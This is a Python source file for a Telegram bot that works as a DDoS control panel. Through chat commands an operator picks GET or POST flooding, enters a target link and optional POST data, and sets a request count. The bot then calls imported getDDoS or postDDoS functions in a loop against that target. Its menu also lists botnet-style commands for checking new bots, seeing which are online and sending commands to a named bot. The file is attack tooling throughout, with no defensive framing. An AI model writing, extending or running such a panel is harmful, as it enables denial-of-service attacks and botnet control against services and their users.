import telebot
import config
from dbworker import set_state, get_current_state
from POSTGET import postDDoS, getDDoS

client = telebot.TeleBot(config.config["token"])

link = []
data = []

def mainDDoS(message):
    if(message.text == "Exit"):
        client.send_message(message.chat.id, 'Logged in - ')
        client.send_message(message.chat.id, "Commands: ")
        client.send_message(message.chat.id, 'DDOS - enter in DDoS panel')
        client.send_message(message.chat.id, 'Check - check new bots')
        client.send_message(message.chat.id, 'Bot name + cmd - command line')
        client.send_message(message.chat.id, 'online - bots online')
        set_state(message.chat.id, config.States.S_LOGINED_A)
    elif(message.text == "GET"):
        client.send_message(message.chat.id, 'Enter link. To exit type "Exit" ')
        set_state(message.chat.id, config.States.S_DDOS_GET1_A)
    elif (message.text == "POST"):
        client.send_message(message.chat.id, 'Enter link. To exit type "Exit" ')
        set_state(message.chat.id, config.States.S_DDOS_POST1_A)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_A)
def GETDDOS1(message):
    if(message.text != "Exit"):
        link.append(message.text)
        client.send_message(message.chat.id, 'Enter count of operations. To exit type "Exit" ')
        set_state(message.chat.id, config.States.S_DDOS_GET2_A)
    else:
        client.send_message(message.chat.id, 'Choose type of DDoS:')
        client.send_message(message.chat.id, 'GET')
        client.send_message(message.chat.id, 'POST')
        client.send_message(message.chat.id, 'To exit type "Exit"')
        set_state(message.chat.id, config.States.S_DDOS_A)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_A)
def GETDDOS2(message):
    if(message.text != "Exit"):
        client.send_message(message.chat.id, 'DDoS is had begun')
        operations = int(message.text)
        for i in range(operations):
            getDDoS(link[0])
        client.send_message(message.chat.id, 'DDoS is end, you was redirected to main menu')
        set_state(message.chat.id, config.States.S_LOGINED_A)
    else:
        client.send_message(message.chat.id, 'Choose type of DDoS:')
        client.send_message(message.chat.id, 'GET')
        client.send_message(message.chat.id, 'POST')
        client.send_message(message.chat.id, 'To exit type "Exit"')
        set_state(message.chat.id, config.States.S_DDOS_A)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_A)
def POSTDDOS1(message):
    if(message.text != "Exit"):
        link.append(message.text)
        client.send_message(message.chat.id, 'Enter data of POST request. To exit type "Exit" ')
        set_state(message.chat.id, config.States.S_DDOS_POST2_A)
    else:
        client.send_message(message.chat.id, 'Choose type of DDoS:')
        client.send_message(message.chat.id, 'GET')
        client.send_message(message.chat.id, 'POST')
        client.send_message(message.chat.id, 'To exit type "Exit"')
        set_state(message.chat.id, config.States.S_DDOS_A)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_A)
def POSTDDOS2(message):
    if(message.text != "Exit"):
        data.append(message.text)
        client.send_message(message.chat.id, 'Enter count of operations. To exit type "Exit" ')
        set_state(message.chat.id, config.States.S_DDOS_POST3_A)
    else:
        client.send_message(message.chat.id, 'Choose type of DDoS:')
        client.send_message(message.chat.id, 'GET')
        client.send_message(message.chat.id, 'POST')
        client.send_message(message.chat.id, 'To exit type "Exit"')
        set_state(message.chat.id, config.States.S_DDOS_A)

@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_A)
def POSTDDOS3(message):
    if(message.text != "Exit"):
        client.send_message(message.chat.id, 'DDoS had begun')
        operations = int(message.text)
        for i in range(operations):
            postDDoS(link[0], data[0])
        client.send_message(message.chat.id, 'DDoS is end, you was redirected to main menu')
        set_state(message.chat.id, config.States.S_LOGINED_A)
    else:
        client.send_message(message.chat.id, 'Choose type of DDoS:')
        client.send_message(message.chat.id, 'GET')
        client.send_message(message.chat.id, 'POST')
        client.send_message(message.chat.id, 'To exit type "Exit"')
        set_state(message.chat.id, config.States.S_DDOS_A)